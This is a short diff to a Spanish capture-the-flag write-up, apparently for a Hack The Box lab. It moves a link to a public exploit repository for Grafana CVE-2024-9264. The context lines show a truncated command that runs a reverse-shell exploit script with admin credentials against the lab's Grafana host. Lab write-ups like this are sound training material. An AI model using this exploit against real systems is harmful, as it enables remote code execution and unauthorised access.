@@ -100,6 +100,7 @@ Cualquier usuario con permiso de VIEWER o superior puede aprovechar esta vulnera
 Es importante destacar que para que el ataque funcione, `el binario de duckdb debe estar presente en el $PATH de Grafana`, aunque por defecto no viene instalado en las distribuciones estándar.
 
 [Grafana Security Advisory CVE-2024-9264](https://grafana.com/security/security-advisories/cve-2024-9264/)
+[Github-CVE-2024-9264-RCE-Exploit](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)
 
 #### Reverse shell
 
@@ -110,8 +111,6 @@ python3 reverse.py --url http://grafana.planning.htb/ --username "admin" --passw
 ```
 
 ![Reverse shell](images/planning_exploit.PNG)
-
-[Github-CVE-2024-9264-RCE-Exploit](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)
 
 #### Tratamiento de la TTY
 
